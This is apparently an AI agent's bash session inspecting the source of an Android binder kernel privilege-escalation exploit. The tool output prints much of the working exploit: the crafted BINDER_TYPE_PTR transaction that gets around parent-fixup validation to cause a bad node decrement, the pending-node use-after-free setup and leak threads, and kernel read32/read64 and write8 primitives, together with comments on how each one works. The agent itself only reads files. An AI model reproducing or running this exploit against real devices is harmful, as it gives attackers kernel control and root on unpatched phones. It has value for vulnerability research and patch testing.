[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && grep -n \"setup_pending_nodes\\|^static.*dec_node\\|void dec_node\\|int dec_node\" exploit.c | head; sed -n \"$(grep -n 'static void setup_pending_nodes' exploit.c | cut -d: -f1),+75p\" exploit.c"}

[tool • bash]
62:void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
294:uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2)
sed: -e expression #1, char 1: unknown command: `,'


Command exited with code 1

[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n '294,400p' exploit.c"}

[tool • bash]
uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2)
{
	struct binder_transaction_data *tr;
	uint8_t txn_data[BINDER_BUFFER_SZ];
	uint8_t rdata[512];
	uint64_t uaf_node = 0, uaf_node2 = 0;
	uint32_t remaining = 0, consumed = 0;
	struct binder_transaction_data *t = (struct binder_transaction_data *)(rdata + sizeof(uint32_t));

	struct binder_io msg, reply;

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	
	/* Compute the reserved buffer size, and ask the endpoint to reserve it. */
	reserved_buffer_sz = RESERVED_BUFFER_SZ - (n1 + n2) * 0x10;
	make_transaction(rdata, false, endpoint_handle, txn_data, reserved_buffer_sz, NULL, 0);
	t->code = RESERVE_BUFFER;
	/* Make the call. */
	binder_write(bs, rdata, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the BR_TRANSACTION_COMPLETE. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);
	/* Free the transaction. */
	tr = ((uint8_t*)rdata + consumed - sizeof(*tr));
	binder_free_buffer(bs, tr->data.ptr.buffer);

	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Retrieve the vma_start address of the endpoint. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, GET_VMA_START) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	uint64_t vma_start = bio_get_uint32(&reply) + (((uint64_t)bio_get_uint32(&reply)) << 32);
	binder_free_buffer(bs, reply.data0);

	/* Now, we exchange handle, so as to create the vulnerable node, and for the endpoint
	 * to be able to reach back to us.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	bio_put_obj(&msg, 0x4141); //Add arbitrary node value
	if (binder_call(bs, &msg, &reply, endpoint_handle, EXCHANGE_HANDLES) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}

	/* The endpoint should have created a ref to the uaf node. */
	uaf_node = bio_get_ref(&reply);
	if (!uaf_node) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node);

	uaf_node2 = bio_get_ref(&reply);
	if (!uaf_node2) {
		log_err("[-] Failed to grab a reference to the UAF node.\n");
		exit(1);
	}

	/* Take a reference to the node. */
	binder_acquire(bs, uaf_node2);


	/* Free the buffer. */
	binder_free_buffer(bs, reply.data0);

	int i;
	pthread_t node_th;

	for (i = 0; i < n1; i++) {
		/* Create the first pending node. */
		node_th = pending_node_create(bs, uaf_node);

		if (th)
			th[i] = node_th;
	}

	int j;
	for (j = 0; j < n2; j++) {
		node_th = pending_node_create(bs, uaf_node2);
		if (th)
			th[i + j] = node_th;
	}

	/* Now that we have a pending node, we can release our reference to it. */
	binder_release(bs, uaf_node);
	binder_release(bs, uaf_node2);


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n '400,460p' exploit.c"}

[tool • bash]
	binder_release(bs, uaf_node2);

	/* Free the reserved buffer. As we are supposed to only perform
	 * transaction up to this size, which won't require creating pending nodes
	 * it should be alright.
	 */
	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, rdata, sizeof(rdata), 10);

	/* Free the reserved buffer. */
	if (binder_call(bs, &msg, &reply, endpoint_handle, FREE_RESERVED_BUFFER) < 0) {
		log_err("[-] Binder call GET_VMA_START failed.\n");
		exit(1);
	}
	binder_free_buffer(bs, reply.data0);

	/* return the vulnerable node reference to the caller. */
	return vma_start;
}

/*
 * Read SELinux enforcing through selinuxfs.
 */
char read_selinux_enforcing() {
   int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
   char enforcing;
   read(fd, &enforcing, 1);
   close(fd);
   return enforcing;
}

struct exp_node * file;
int pipes[2];

/*
 * 32-bit kernel read primitive using corrupted f_inode, such that 
 * epitem.event.data overlaps with f_inode->i_sb.
 */

uint64_t read32(uint64_t addr) {
   struct epoll_event evt;
   evt.events = 0;
   evt.data.u64 = addr - 24;
   int err = epoll_ctl(file->ep_fd, EPOLL_CTL_MOD, pipes[0], &evt);
   uint32_t test = 0xdeadbeef;
   ioctl(pipes[0], FIGETBSZ, &test);
   return test;
}

/*
 * 64-bit kernel read primitive using read32
 */

uint64_t read64(uint64_t addr) {
   uint32_t lo = read32(addr);
   uint32_t hi = read32(addr+4);

   return (((uint64_t)hi) << 32) | lo;
}

void *ctl_table_uaddr;


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n \"$(grep -n 'pending_node_thread' pending_node.c | head -1 | cut -d: -f1),+110p\" pending_node.c"}

[tool • bash]
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint64_t retval = 0;

	/* Enter looper. */
	binder_write(from, &looper, sizeof(looper));

	struct binder_transaction_data *t = (struct binder_transaction_data *)(msg_data + sizeof(uint32_t));
	make_transaction(msg_data, false, handle, reply_data, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(from, msg_data, sizeof(*t) + sizeof(uint32_t));

	/* Poll for the answer. */
	/* Wait for BR_TRANSACTION_COMPLETE. */
	struct pollfd pfd;
	pfd.fd = from->fd;
	pfd.events = POLLIN;
	/* Wait up to a sec. */
	if (!poll(&pfd, 1, 1000)) {
		fprintf(stderr, "[-] Something went wrong will inserting the pending node.\n");
		pthread_exit(&res);
	}

	pthread_barrier_wait(&node->ready);
	
	pthread_barrier_wait(&node->ready);

   /* We wait here, until ask by the exploit to leak values from the transaction. */
   pthread_barrier_wait(&node->do_barrier); //Do leak

	/* Reading back transaction. */
	consumed = remaining = 0;
   uint32_t cmd;
	do {
      cmd = binder_read_next(from, reply_data, &remaining, &consumed);
   } while (cmd != BR_TRANSACTION && cmd != BR_REPLY); 

   /* Getting a BR_REPLY, would mean that we successfully cleaned up the transaction. */
   if (cmd == BR_REPLY)  {
      goto end;
   }
   
   t = (struct binder_transaction_data *)(reply_data + consumed - sizeof(*t));
	/* data at offset 0x58. */
	node->uaf_buffer = t->data.ptr.buffer;

	node->leaked_data[0] = t->target.ptr; /* data at offset 0x58. */
	node->leaked_data[1] = t->cookie;	/* data at offset 0x60. */

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;

   node->state = NODE_LEAKED;

   pthread_barrier_wait(&node->done_barrier);
   pthread_barrier_wait(&node->ready);

   /* This for sync. */

   pthread_barrier_wait(&node->do_barrier);

	/* Check the node state. */
	if (node->state == NODE_FINISHED)
		goto end;


	/* If we decide to go ahead with the buffer freeing, wait on the barrier,
	 * otherwise just exit the thread.
	 */
   binder_free_buffer(from, node->uaf_buffer);
   node->state = NODE_FREE;
end:
   pthread_barrier_wait(&node->done_barrier);
   ioctl(node->bs->fd, BINDER_THREAD_EXIT, 0);
	pthread_exit(&retval);
}



static void pending_node_create_thread(void *args)
{
	struct binder_state *bs = (struct binder_state *)*(uint64_t *)args;
	uint64_t node = *(uint64_t *)(args + 8);

	/* Create a ONE_WAY transaction to ask the endpoint to create a pending_node
	 * back to us.
	 */
	struct binder_transaction_data *t;
	uint8_t rdata[128];
	uint8_t txn_data[128];

	uint32_t remaining = 0, consumed = 0;
	struct binder_io msg, reply;

	/* Register this thread as a looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(bs, &looper, sizeof(looper));



[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n \"$(grep -n 'pending_node_create_thread' pending_node.c | head -1 | cut -d: -f1),+85p\" pending_node.c | sed -n '28,85p'"}

[tool • bash]
	/* Make the binder call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	/* Wait for the transaction from the endpoint. */
	while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_TRANSACTION);


	// printf("[*] Node should be made\n");
	// getchar();

	/* Get transaction. */
	t = (struct binder_transaction_data *)(rdata + consumed - sizeof(*t));

	if (t->code != ADD_PENDING_NODE) {
		fprintf(stderr, "[-] Invalid transaction code %x. Expected %x\n", t->code, ADD_PENDING_NODE);
		exit(1);
	}

	/* Free the buffer. */
	binder_free_buffer(bs, t->data.ptr.buffer);

	/* Okay, so instead of a reply, we send a new transaction here, in order to have the thing go into the pending node list. */
	t = (struct binder_transaction_data *)(txn_data + sizeof(uint32_t));
	make_transaction(txn_data, false, node, rdata, 0x10, NULL, 0);
	/* Fix transaction code. */
	t->code = ADD_PENDING_NODE;
	/* Make the call. */
	binder_write(bs, txn_data, sizeof(*t) + sizeof(uint32_t));

	int res = 0;
	pthread_exit(&res);
}

/*
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;



[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n \"$(grep -n 'pending_node_leak\\|pending_node_free\\|pending_node_write8\\|terminate_pending_node' pending_node.c | head -4 | tail -1 | cut -d: -f1),+95p\" pending_node.c"}

[tool • bash]
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && grep -n \"pending_node_free\\|pending_node_write8\\|terminate_pending_node\\|pending_node_get\\b\" pending_node.c; sed -n \"$(grep -n 'static void pending_node_free' pending_node.c | cut -d: -f1),+75p\" pending_node.c"}

[tool • bash]
60:static struct pending_node *pending_node_get(pthread_t node_th)
264:void terminate_pending_node(pthread_t th)
267:	struct pending_node *node = pending_node_get(th);
314:void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
335:void pending_node_write8(pthread_t th)
337:	struct pending_node *node = pending_node_get(th);
387:	struct pending_node *node = pending_node_get(th);
sed: -e expression #1, char 1: unknown command: `,'


Command exited with code 1

[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n '230,390p' pending_node.c"}

[tool • bash]
 * The endpoint calls into this function to setup a pending node.
 */
pthread_t add_pending_node(struct binder_state *from, uint64_t pending_node)
{
	pthread_t th;

	struct pending_node *node = NULL;

	/* Create new pending_node */
	node = pending_node_new();
	if (!node)
		return NULL;

	node->bs = from;
	node->uaf_node = pending_node;

	if (pthread_create(&th, NULL, pending_node_thread, (void *)node)) {
		perror("pthread");
		return (pthread_t)-1;
	}

	node->uaf_node_th = th;
	last_node_th = th;

	pthread_barrier_wait(&node->ready);
	
   return th;
}


/*
 * The endpoint calls into this function to
 * remove a specific pending node.
 */
void terminate_pending_node(pthread_t th)
{
	/* Just unlock the barrier, and pthread_join */
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;


   pthread_barrier_wait(&node->ready);
   node->state = NODE_FINISHED;
   node->uaf_buffer = 0;
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	pthread_join(node->uaf_node_th, NULL);

	/* Remove node. */
	
	struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}
	free(node);
}


/*
 * Perform a ADD_PENDING_NODE binder query, in order to ask the remote
 * endpoint to create a pending node transaction.
 */
pthread_t pending_node_create(struct binder_state *bs, uint64_t node)
{
	uint64_t args[] = {bs, node};
	pthread_t th;

	if (pthread_create(&th, NULL, pending_node_create_thread, (void *)args)) {
		perror("pthread create\n");
		exit(0);
	}

	pthread_join(th, NULL);

	return last_node_th;
}

void pending_node_free(struct binder_state *bs, uint64_t node, uint64_t vma_start, uint32_t strong, uint32_t weak, bool second)
{
	/* So we have our pending node in another thread. Now release our reference to uaf_node
	 * and trigger the bug (3 times needs) to free the uaf_node, while the pending node thread keeps
	 * a reference to it (as target_node)
	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && grep -rn \"RESERVED_BUFFER_SZ\\|BINDER_BUFFER_SZ\\|BIO_SIZE\\|NREALLOC\\|BUFSZ\" *.c ../include/*.h | grep define; grep -n \"TRIGGER_DECREF\\|ADD_PENDING_NODE\\|RESERVE_BUFFER\\|FREE_RESERVED_BUFFER\\|GET_VMA_START\\|EXCHANGE_HANDLES\\|TERMINATE_PENDING\" exploit.c endpoint.c pending_node.c | grep -i \"define\\|=\" | head -20"}

[tool • bash]
binder.c:18:#define MAX_BIO_SIZE (1 << 30)
exploit.c:24:#define BINDER_BUFFER_SZ	128 * 1024
exploit.c:25:#define RESERVED_BUFFER_SZ	127 * 1024
../include/realloc.h:4:#define NREALLOC 0x80 * 8
../include/realloc.h:5:#define BUFSZ	0x80
exploit.c:258:   writebuf.txn.code = TRIGGER_DECREF;
exploit.c:323:	t->code = RESERVE_BUFFER;
pending_node.c:97:	t->code = ADD_PENDING_NODE;
pending_node.c:193:	t->code = ADD_PENDING_NODE;
pending_node.c:209:	if (t->code != ADD_PENDING_NODE) {
pending_node.c:221:	t->code = ADD_PENDING_NODE;


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && grep -n \"GET_VMA_START\\|EXCHANGE_HANDLES\\|ADD_PENDING_NODE\\|TERMINATE_PENDING_NODE\\|RESERVE_BUFFER\\|FREE_RESERVED_BUFFER\\|TRIGGER_DECREF\" endpoint.c | head; echo ====; sed -n \"$(grep -n 'TRIGGER_DECREF' exploit.c | head -1 | cut -d: -f1),+40p\" exploit.c"}

[tool • bash]
30:		case GET_VMA_START:
36:		case EXCHANGE_HANDLES:
51:		case ADD_PENDING_NODE:
57:		case TERMINATE_PENDING_NODE:
62:		case RESERVE_BUFFER:
73:		case FREE_RESERVED_BUFFER:
80:		case TRIGGER_DECREF:
====
   writebuf.txn.code = TRIGGER_DECREF;
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = ((uint8_t*)ptr) - ((uint8_t *)data);
   writebuf.txn.offsets_size = ((uint8_t*)offs) - ((uint8_t *)offsets);
   writebuf.txn.data.ptr.buffer = data;
   writebuf.txn.data.ptr.offsets = offsets;
   buflen = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;
   writebuf.buffers_size = buflen;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send bogus query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

   /* Wait for the reply and free. */
   remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_REPLY);

   /* Free the transaction buffer. */
   td = (struct binder_transaction_data *)(data + consumed - sizeof(*td));
   /* Free buffer. */
   binder_free_buffer(bs, td->data.ptr.buffer);
}


/*
 * Do all the preparation for the exploitation, that is setup up a number of pending nodes
 * on the soon to be dangling `binder_node`. I used multiple pending nodes as I need to leak values
 * multiple times in order to disclose the kernel address of the dangling `binder_node`, and know
 * where I add controlled kernel data in order to bypass PAN.
 */
uint64_t setup_pending_nodes(struct binder_state *bs, uint64_t endpoint_handle, pthread_t *th, uint32_t n1, uint32_t n2)
{
	struct binder_transaction_data *tr;
	uint8_t txn_data[BINDER_BUFFER_SZ];
	uint8_t rdata[512];


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n \"$(grep -n 'void dec_node' exploit.c | cut -d: -f1),+230p\" exploit.c"}

[tool • bash]
void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
{

   struct binder_transaction_data_sg sg;
   struct binder_transaction_data *td;
   struct binder_write_read bwr;

   uint64_t handle = 0; /* It *SHOULD* be 0 as it's the value from ref created from the ctx mgr node. */

   /* Send a big buffer. */

   uint32_t tr_size = reserved_buffer_sz; // Use a query size of 0x20000 (we subtract 0x10 for the secctx)
   uint8_t data[BINDER_BUFFER_SZ];
   uint64_t offsets[128];
   uint8_t sg_buf[0x1000];
   uint32_t readbuf[32];
   uint8_t *ptr = data;
   uint64_t *offs = offsets;
   uint8_t buf[0x100];
   uint32_t buflen = 0;


   /*
   * Used to perform BC_TRANSACTION_SG queries.
   */
   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;

   *(uint64_t *)(data + 0xe8) = 0x40; // offset of valid BINDER_TYPE_PTR
   /* The purpose of this apparently useless transaction is to initialize the content of the qword at
   * offset 0xf0 from the beginning of the transaction buffer of the servicemanager.
   * I used a transaction size of 0x20000 to be sure to retrieve the whole buffer for myself, and this way 
   * be sure to be serviced the very beginning of the transaction buffer.
   */
   // the transaction won't make it through as it will fail trying to copy from a NULL userland pointer
   binder_transaction(bs, false, target, data, tr_size, NULL, 1); 


   /* Wait for the BR_FAILED_REPLY. */
   uint32_t remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_FAILED_REPLY);

   memset(buf, 0, 0x100);
   memset(offsets, 0, 128 * sizeof(uint64_t));

   /* From here it gets a little bit messy / crafty. */

   /*
   * Create the first object valid object, which will be smashed after the bug has been successfully triggered.
   */
   struct flat_binder_object *fbo = (struct flat_binder_object *)ptr;
   fbo->hdr.type = strong ? BINDER_TYPE_HANDLE : BINDER_TYPE_WEAK_HANDLE;
   fbo->flags = 0;
   fbo->handle = target;
   fbo->cookie = 0;
   *(offs++) = ((uint8_t *)fbo) - data;
   ptr = ++fbo;


   /*
   * Here, we craft a BINDER_TYPE_PTR, which won't be added to the offset array, and will thus not be validated by the binder
   * driver. It will be used later, once the bug is triggered, and we can make the `parent` pointer, point to this object.
   * As it wasn't validated we can't assign it an arbitrary length. The sole purpose of this object is to use the
   * binder parent fixup code to overwrite a qword at an "arbitrary" offset with the userland address of a child buffer.
   * This is the primitive which is used to overwrite the handle value of the BINDER_TYPE_HANDLE we created above.
   */
   struct binder_buffer_object *bbo = (struct binder_buffer_object *)(ptr);         //For now, we assume the fd will be 4
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = vma_start; /* This *MUST* be the address of the beginning of the userland mapping of /dev/binder. */
   bbo->length = 0xdeadbeefbadc0ded;
   bbo->parent = 0;
   bbo->parent_offset = 0;
   ptr = ++bbo;

   /* This one is the official one. */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = 0;
   bbo->buffer = sg_buf;
   bbo->length = 0x10;
   bbo->parent = 0;
   bbo->parent_offset = 0;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* We create an additionnal BINDER_TYPE_PTR, whose parent will be the one we created just above. This is where the bug is triggered,
   * as the bbo->parent index is set to 6 which is wrong as it is > to the number of offsets in the offsets array. offs[6] will thus end up pointing in
   * not yet initalized data reserved for the sg_buf. The whole purpose of the seemingly useless first transaction was to initialize this address with the 
   * value 0x40, which is the offset of the previous BINDER_TYPE_PTR object in order for the `binder_validate_ptr` and `binder_valid_fixup` function to succeed.
   * This BINDER_TYPE_PTR is then eventually validated and the `last_fixup_obj_off` is set to the offset of this object.
   * This implies that we just validated a BINDER_TYPE_PTR whose bbo->parent index points into an array entry which will be modified by the next BINDER_TYPE_PTR below,
   * that the driver will process.
   */
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = NULL;
   bbo->length = 0;
   bbo->parent = 6;
   bbo->parent_offset = 0;
   buflen += bbo->length;

   // Add it to the offsets array
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* 
   * And finally, the last nail in the coffin.
   * We craft the almost exact same BINDER_TYPE_PTR as above, still having a parent index of 6. This time however, we specific a 'buffer', whose data will be copied from
   * before validating the BINDER_TYPE_PTR. This qword will overwrite the value at offs[6], replacing the value 0x40 pointing to a validated BINDER_TYPE_PTR, with the value 0x18,
   * which points to the very first BINDER_TYPE_PTR, which wasn't validated by the binder driver as we haven't added it's offset to the offsets array. The following will now happen
   * in `binder_fixup_parent()`:
   * ```c
   2884         parent = binder_validate_ptr(target_proc, b, &object, bp->parent,
   2885                                      off_start_offset, &parent_offset,
   2886                                      num_valid);
   ...
   2893         if (!binder_validate_fixup(target_proc, b, off_start_offset,
   2894                                    parent_offset, bp->parent_offset,
   2895                                    last_fixup_obj_off,
   2896                                    last_fixup_min_off)) {
   2897                 binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
   2898                                   proc->pid, thread->pid);
   2899                 return -EINVAL;
   2900         }
   * ```
   * Here, parent will now point to the unvalidated BINDER_TYPE_PTR, however, to be used by the driver it needs to be validated by the `binder_validate_fixup()` function:
   * ```c
   * 2414 static bool binder_validate_fixup(struct binder_proc *proc,
   2415                                   struct binder_buffer *b,
   2416                                   binder_size_t objects_start_offset,
   2417                                   binder_size_t buffer_obj_offset,
   2418                                   binder_size_t fixup_offset,
   2419                                   binder_size_t last_obj_offset,
   2420                                   binder_size_t last_min_offset)
   2421 {
   ...
   2427         while (last_obj_offset != buffer_obj_offset) {
   2428                 unsigned long buffer_offset;
   2429                 struct binder_object last_object;
   2430                 struct binder_buffer_object *last_bbo;
   2431                 size_t object_size = binder_get_object(proc, b, last_obj_offset,
   2432                                                        &last_object);
   2433                 if (object_size != sizeof(*last_bbo))
   2434                         return false;
   2435
   2436                 last_bbo = &last_object.bbo;
   2437                 *
   2438                 * Safe to retrieve the parent of last_obj, since it
   2439                 * was already previously verified by the driver.
   2440                 *
   2441                 if ((last_bbo->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
   2442                         return false;
   2443                 last_min_offset = last_bbo->parent_offset + sizeof(uintptr_t);
   2444                 buffer_offset = objects_start_offset +
   2445                         sizeof(binder_size_t) * last_bbo->parent,
   2446                 binder_alloc_copy_from_buffer(&proc->alloc, &last_obj_offset,
   2447                                               b, buffer_offset,
   2448                                               sizeof(last_obj_offset));
   2449         }
   2450         return (fixup_offset >= last_min_offset);
   2451 }
   ```
   Here, as the `last_bbo` pointer was previously validated by the driver, it is trusted, and it particular, its `parent` field is trusted. However, the value of
   last_bbo->parent is now `0x18` instead of `0x40`, which ends up setting `last_obj_offset` to the same value as `buffer_obj_offset` (which is the offset of the
   fake BINDER_TYPE_PTR), and exists the loop. From now on, the driver will be manipulating and unvalidated object. The following code will try to fixup the buffer address
   in the fake BINDER_TYPE_PTR object:
   ```c
   2909         buffer_offset = bp->parent_offset +
   2910                         (uintptr_t)parent->buffer - (uintptr_t)b->user_data;
   2911         binder_alloc_copy_to_buffer(&target_proc->alloc, b, buffer_offset,
   2912                                     &bp->buffer, sizeof(bp->buffer));
   ```
   As the parent->buffer is equal to b->user_data, only the parent_offset which is 8, is taken into account. This means that the userland address of the
   bp->buffer will be copied at the offset 8 from the beginning of the binder buffer, which happens to be the offset of the node value of the BINDER_TYPE_HANDLE 
   (which has meanwhile been transformed into a BINDER_TYPE_BINDER by the binder driver) object we added at the beginning of the transaction. When eventually entering
   the binder_transaction_buffer_release() function, the driver will fail trying to decrement the invalid node.
   */
   uint64_t new_off = 0x18;
   bbo->hdr.type = BINDER_TYPE_PTR;
   bbo->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
   bbo->buffer = &new_off;
   bbo->length = sizeof(new_off);
   bbo->parent = 0x6; // offs[6] = 0x18;
   bbo->parent_offset = 0x8 + ((second == true) ? 4 : 0);
   *(offs++) = ((uint8_t *)bbo) - data;
   ptr = ++bbo;

   /* Send the BC_TRANSACTION_SG transaction. */
   writebuf.cmd = BC_TRANSACTION_SG;
   //writebuf.txn.target.handle = 0; // Ctxt mgr
   writebuf.txn.target.handle = target; // endpoint
   writebuf.txn.code = TRIGGER_DECREF;
   writebuf.txn.flags = 0;
   writebuf.txn.data_size = ((uint8_t*)ptr) - ((uint8_t *)data);
   writebuf.txn.offsets_size = ((uint8_t*)offs) - ((uint8_t *)offsets);
   writebuf.txn.data.ptr.buffer = data;
   writebuf.txn.data.ptr.offsets = offsets;
   buflen = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;
   writebuf.buffers_size = buflen;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send bogus query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);

   /* Wait for the reply and free. */
   remaining = 0, consumed = 0;
   while (binder_read_next(bs, data, &remaining, &consumed) != BR_REPLY);

   /* Free the transaction buffer. */
   td = (struct binder_transaction_data *)(data + consumed - sizeof(*td));
   /* Free buffer. */
   binder_free_buffer(bs, td->data.ptr.buffer);
}


/*
 * Do all the preparation for the exploitation, that is setup up a number of pending nodes
 * on the soon to be dangling `binder_node`. I used multiple pending nodes as I need to leak values
 * multiple times in order to disclose the kernel address of the dangling `binder_node`, and know
 * where I add controlled kernel data in order to bypass PAN.


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n '20,100p' endpoint.c"}

[tool • bash]
static struct endpoint_handle *endpoints = NULL;

static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{

	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;

	switch (tr->code) {
		case GET_VMA_START:
			/* Do it in 2 times. */
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			/* Acquire the handle. */
			binder_acquire(bs, handle->client_handle);

			/* Create the vulnerable node in the process. */
